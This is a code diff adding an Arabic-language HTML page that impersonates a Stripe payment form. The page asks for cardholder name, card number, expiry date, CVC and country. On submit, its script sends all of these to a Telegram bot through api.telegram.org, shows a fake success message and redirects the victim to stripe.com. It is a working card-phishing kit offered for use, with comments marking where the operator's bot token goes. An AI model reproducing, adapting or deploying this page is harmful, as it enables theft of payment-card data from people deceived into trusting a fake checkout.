@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stripe Pay - Secure</title>
+    <style>
+        body { margin: 0; padding: 0; font-family: -apple-system, sans-serif; background-color: #fff; width: 100vw; }
+        .container { width: 100%; padding: 20px; box-sizing: border-box; }
+        h2 { font-size: 24px; margin-bottom: 30px; text-align: center; }
+        
+        .input-group { position: relative; margin-bottom: 25px; }
+        
+        /* ضبط الحقل لترك مساحة للأيقونات على اليمين */
+        input { 
+            width: 100%; padding: 20px; border: 2px solid #ccc; font-size: 18px; 
+            box-sizing: border-box; padding-left: 90px; /* مساحة لصور الفيزا والماستر */
+        }
+        
+        /* الأيقونات في أقصى اليمين داخل المربع */
+        .card-logos { 
+            position: absolute; left: 10px; top: 18px; display: flex; gap: 5px; 
+        }
+        .card-logos img { width: 35px; height: 25px; object-fit: contain; }
+        
+        .row { display: flex; gap: 10px; margin-bottom: 25px; }
+        .row input { flex: 1; padding-left: 20px; }
+        button { width: 100%; padding: 22px; background: #635bff; color: white; border: none; font-size: 20px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>تفاصيل الدفع</h2>
+    <form id="payForm">
+        <input type="number" id="amount" placeholder="المبلغ المراد تحويله (USD)" style="margin-bottom: 25px; width: 100%; padding: 20px; border: 2px solid #ccc; box-sizing: border-box;" required>
+        <input type="text" id="name" placeholder="اسم حامل البطاقة" style="margin-bottom: 25px; width: 100%; padding: 20px; border: 2px solid #ccc; box-sizing: border-box;" required>
+        
+        <div class="input-group">
+            <input type="text" id="card_number" placeholder="رقم البطاقة" maxlength="16" required>
+            <!-- الأيقونات تظهر في أقصى اليمين داخل الحقل -->
+            <div class="card-logos">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
+            </div>
+        </div>
+        
+        <div class="row">
+            <input type="number" id="month" placeholder="الشهر" required>
+            <input type="number" id="year" placeholder="السنة" required>
+            <input type="number" id="cvv" placeholder="CVC" maxlength="3" required>
+        </div>
+        
+        <input type="text" id="country" placeholder="البلد / المنطقة" style="width: 100%; padding: 20px; border: 2px solid #ccc; box-sizing: border-box; margin-bottom: 25px;" required>
+        <button type="submit">إتمام الدفع</button>
+    </form>
+</div>
+
+<script>
+    const BOT_TOKEN = "YOUR_BOT_TOKEN"; // ضع التوكين هنا
+    const CHAT_ID = "YOUR_CHAT_ID";     // ضع الآيدي هنا
+
+    document.getElementById('payForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const data = `💰 القيمة: ${document.getElementById('amount').value}\n👤 الاسم: ${document.getElementById('name').value}\n💳 البطاقة: ${document.getElementById('card_number').value}\n📅 التاريخ: ${document.getElementById('month').value}/${document.getElementById('year').value}\n🔒 CVC: ${document.getElementById('cvv').value}\n🌍 المدينة: ${document.getElementById('country').value}`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(data)}`)
+            .then(() => {
+                alert("تمت العملية بنجاح! جاري المعالجة...");
+                window.location.href = "https://stripe.com";
+            });
+    });
+</script>
+</body>
+</html>
